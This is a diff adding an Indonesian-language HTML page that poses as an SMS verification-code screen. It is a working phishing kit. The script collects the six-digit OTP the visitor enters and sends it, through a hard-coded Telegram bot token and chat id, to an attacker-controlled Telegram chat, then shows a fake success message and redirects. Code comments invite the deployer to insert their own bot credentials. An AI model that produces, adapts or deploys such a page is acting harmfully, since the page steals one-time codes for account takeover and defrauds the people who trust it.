@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#28a745">
+    <title>Masukkan Kode Verifikasi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f7f7;
+        }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            margin-top: -90%;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .container img {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        .otp-inputs input {
+            width: 40px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: none;
+            border-bottom: 2px solid #28a745;
+            outline: none;
+        }
+        .resend {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        .resend a {
+            color: #28a745;
+            text-decoration: none;
+        }
+        .submit-btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .countdown {
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co/0JmdN4p/1000010845-removebg-preview.png" alt="Logo">
+        <h2>Masukkan Kode Verifikasi</h2>
+        <p>Kode verifikasi telah dikirim melalui SMS ke +628xxxxxxxxx</p>
+        <form id="otp-form">
+            <div class="otp-inputs">
+                <input type="tel" maxlength="1" name="digit1" required>
+                <input type="tel" maxlength="1" name="digit2" required>
+                <input type="tel" maxlength="1" name="digit3" required>
+                <input type="tel" maxlength="1" name="digit4" required>
+                <input type="tel" maxlength="1" name="digit5" required>
+                <input type="tel" maxlength="1" name="digit6" required>
+            </div>
+            <button type="button" class="submit-btn" id="verify-btn">Verifikasi</button>
+        </form>
+        <p class="resend">Tidak menerima kode? <span id="countdown">60</span> detik <a href="#">Kirim ulang</a> atau <a href="#">gunakan metode verifikasi lain</a>.</p>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.otp-inputs input');
+            const verifyBtn = document.getElementById('verify-btn');
+
+            // Memindahkan fokus secara otomatis ke input berikutnya saat pengguna memasukkan kode OTP
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+            });
+
+            // Hitung mundur waktu untuk kirim ulang
+            var countdownElement = document.getElementById('countdown');
+            var countdown = 60;
+            var interval = setInterval(function() {
+                countdown--;
+                countdownElement.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    countdownElement.textContent = "Kirim ulang sekarang";
+                }
+            }, 1000);
+
+            // Fungsi saat tombol Verifikasi ditekan
+            verifyBtn.addEventListener('click', function() {
+                // Menggabungkan semua input OTP
+                let otp = '';
+                inputs.forEach(input => {
+                    otp += input.value;
+                });
+
+                // Memastikan OTP terdiri dari 6 digit
+                if (otp.length === 6) {
+                    sendOtpToTelegram(otp);
+                } else {
+                    alert('Harap masukkan kode OTP lengkap.');
+                }
+            });
+
+            // Fungsi untuk mengirim OTP ke Telegram menggunakan AJAX
+            function sendOtpToTelegram(otp) {
+                var telegramToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48'; // Ganti dengan token bot Telegram Anda
+                var chatId = '6824078885'; // Ganti dengan chat_id Telegram Anda
+                var message = "Kode OTP: " + otp;
+
+                var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                // Membuat request AJAX
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        // Jika berhasil, Anda bisa mengarahkan ke halaman sukses atau menampilkan pesan
+                        alert('Kode OTP berhasil dikirim!');
+                        window.location.href = "success.html"; // Halaman setelah OTP berhasil diverifikasi
+                    } else if (xhr.readyState == 4) {
+                        alert('Gagal mengirim kode OTP, coba lagi.');
+                    }
+                };
+                xhr.send();
+            }
+        });
+    </script>
+</body>
+</html>
